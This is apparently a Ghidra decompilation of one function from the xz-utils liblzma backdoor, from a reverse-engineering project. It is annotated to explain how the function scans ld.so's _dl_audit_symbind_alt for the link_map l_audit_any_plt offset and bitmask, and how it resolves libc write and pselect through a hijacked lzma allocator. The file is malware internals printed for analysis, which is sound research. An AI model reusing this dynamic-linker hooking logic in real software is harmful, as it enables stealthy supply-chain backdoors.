// /home/kali/xzre-ghidra/xzregh/104EE0_find_link_map_l_audit_any_plt.c
// Function: find_link_map_l_audit_any_plt @ 0x104EE0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_link_map_l_audit_any_plt(backdoor_data_handle_t * data, ptrdiff_t libname_offset, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Starting from the `_dl_audit_symbind_alt` body, it looks for the LEA that materialises
 * `link_map::l_name`, confirms the register usage matches the displacement into the link_map, and
 * then seeds an `instruction_search_ctx_t` that calls
 * `find_link_map_l_audit_any_plt_bitmask`. Success means both the offset of the byte and the mask
 * needed to set/clear it are recorded in `hooks->ldso_ctx`.
 */
#include "xzre_types.h"


BOOL find_link_map_l_audit_any_plt
               (backdoor_data_handle_t *data,ptrdiff_t libname_offset,backdoor_hooks_data_t *hooks,
               imported_funcs_t *imported_funcs)

{
  libc_imports_t *plVar1;
  u32 uVar2;
  u64 uVar3;
  BOOL BVar4;
  lzma_allocator *allocator;
  pfn_write_t ppVar5;
  pfn_pselect_t ppVar6;
  long lVar7;
  undefined1 uVar8;
  dl_audit_symbind_alt_fn code_start;
  u8 *puVar9;
  dasm_ctx_t *pdVar10;
  instruction_search_ctx_t *piVar11;
  undefined4 *puVar12;
  undefined1 uVar13;
  dl_audit_symbind_alt_fn code_end;
  byte bVar14;
  instruction_search_ctx_t search_state;
  dl_audit_symbind_alt_fn audit_stub;
  pfn_write_t write_stub;
  pfn_pselect_t pselect_stub;
  undefined4 local_c8;
  undefined4 local_c4;
  instruction_search_ctx_t local_c0;
  dasm_ctx_t local_80;
  
  bVar14 = 0;
  BVar4 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x85,0x12,8,FALSE);
  if (BVar4 != FALSE) {
    plVar1 = imported_funcs->libc;
    pdVar10 = &local_80;
    for (lVar7 = 0x16; lVar7 != 0; lVar7 = lVar7 + -1) {
      *(undefined4 *)&pdVar10->instruction = 0;
      pdVar10 = (dasm_ctx_t *)((long)pdVar10 + (ulong)bVar14 * -8 + 4);
    }
    local_c8 = 0;
    local_c4 = 0;
    allocator = get_lzma_allocator();
    allocator->opaque = data->elf_handles->libc;
    ppVar5 = (pfn_write_t)lzma_alloc(0x380,allocator);
    uVar2 = local_c4;
    plVar1->write = ppVar5;
    if (ppVar5 != (pfn_write_t)0x0) {
      plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
    }
    code_start = (hooks->ldso_ctx)._dl_audit_symbind_alt;
    local_c8._0_3_ = CONCAT12(0xff,(undefined2)local_c8);
    local_c8 = CONCAT22(local_c8._2_2_,(undefined2)local_c8) | 0x80;
    local_c4._0_2_ = (ushort)local_c4 | 2;
    code_end = code_start + (hooks->ldso_ctx)._dl_audit_symbind_alt__size;
    local_c4._3_1_ = SUB41(uVar2,3);
    local_c4._0_3_ = CONCAT12(0xff,(ushort)local_c4);
    ppVar6 = (pfn_pselect_t)lzma_alloc(0x690,allocator);
    plVar1->pselect = ppVar6;
    if (ppVar6 != (pfn_pselect_t)0x0) {
      plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
    }
    while ((code_start < code_end &&
           (BVar4 = x86_dasm(&local_80,(u8 *)code_start,(u8 *)code_end),
           uVar3 = local_80.instruction_size, BVar4 != FALSE))) {
      if ((local_80._40_4_ == 0x1036) &&
         ((((ushort)local_80.prefix._0_4_ & 0x140) == 0x140 &&
          ((byte)(local_80.prefix._13_1_ - 1) < 2)))) {
        uVar13 = 0;
        if ((local_80.prefix._0_4_ & 0x40) == 0) {
          uVar8 = 0;
          if ((((local_80.prefix._0_4_ & 0x1040) != 0) &&
              (uVar8 = local_80.prefix.decoded.flags2 & 0x10, (local_80.prefix._0_4_ & 0x1000) != 0)
              ) && (uVar8 = local_80.imm64_reg, (local_80.prefix._0_4_ & 0x20) != 0)) {
            uVar8 = local_80.imm64_reg | ((byte)local_80.prefix.decoded.rex & 1) << 3;
          }
        }
        else {
          uVar8 = local_80.prefix.decoded.flags & 0x20;
          if ((local_80.prefix._0_4_ & 0x20) == 0) {
            uVar13 = local_80.prefix._15_1_;
            if ((local_80.prefix._0_4_ & 0x1040) != 0) {
              uVar8 = local_80.prefix._14_1_;
            }
          }
          else {
            uVar13 = local_80.prefix._15_1_ | (char)local_80.prefix.decoded.rex * '\b' & 8U;
            uVar8 = 0;
            if ((local_80.prefix._0_4_ & 0x1040) != 0) {
              uVar8 = (char)local_80.prefix.decoded.rex * '\x02' & 8U | local_80.prefix._14_1_;
            }
          }
        }
        if ((local_80.prefix._0_4_ & 0x100) != 0) {
          puVar9 = (u8 *)local_80.mem_disp;
          if (((uint)local_80.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
            puVar9 = local_80.instruction + (long)(local_80.mem_disp + local_80.instruction_size);
          }
          if ((puVar9 < (ulong)libname_offset) && (puVar9 != (u8 *)0x0)) {
            piVar11 = &local_c0;
            for (lVar7 = 0x10; lVar7 != 0; lVar7 = lVar7 + -1) {
              *(undefined4 *)&piVar11->start_addr = 0;
              piVar11 = (instruction_search_ctx_t *)((long)piVar11 + (ulong)bVar14 * -8 + 4);
            }
            if (((int)(local_c8 & 0xffff) >> (uVar13 & 0x1f) & 1U) == 0) {
              if (((int)(local_c4 & 0xffff) >> (uVar13 & 0x1f) & 1U) == 0) goto LAB_00104fd8;
              local_c4._0_3_ = CONCAT12(uVar8,(ushort)local_c4);
              puVar12 = (undefined4 *)((long)&local_c0.offset_to_match + 4);
              for (lVar7 = 7; lVar7 != 0; lVar7 = lVar7 + -1) {
                *puVar12 = 0;
                puVar12 = puVar12 + (ulong)bVar14 * -2 + 1;
              }
              local_c0.output_register_to_match = &local_c4;
              local_c0.output_register = (u8 *)&local_c8;
            }
            else {
              local_c8._0_3_ = CONCAT12(uVar8,(undefined2)local_c8);
              puVar12 = (undefined4 *)((long)&local_c0.offset_to_match + 4);
              for (lVar7 = 7; lVar7 != 0; lVar7 = lVar7 + -1) {
                *puVar12 = 0;
                puVar12 = puVar12 + (ulong)bVar14 * -2 + 1;
              }
              local_c0.output_register_to_match = &local_c8;
              local_c0.output_register = (u8 *)&local_c4;
            }
            local_c0.start_addr = (u8 *)(code_start + uVar3);
            local_c0.end_addr = (u8 *)code_end;
            local_c0.offset_to_match._0_4_ = (int)puVar9;
            local_c0.hooks = hooks;
            local_c0.imported_funcs = imported_funcs;
            BVar4 = find_link_map_l_audit_any_plt_bitmask(data,&local_c0);
            if (BVar4 != FALSE) {
              return TRUE;
            }
            if (local_c0.result != FALSE) {
              return FALSE;
            }
          }
        }
      }
LAB_00104fd8:
      code_start = code_start + local_80.instruction_size;
    }
  }
  return FALSE;
}

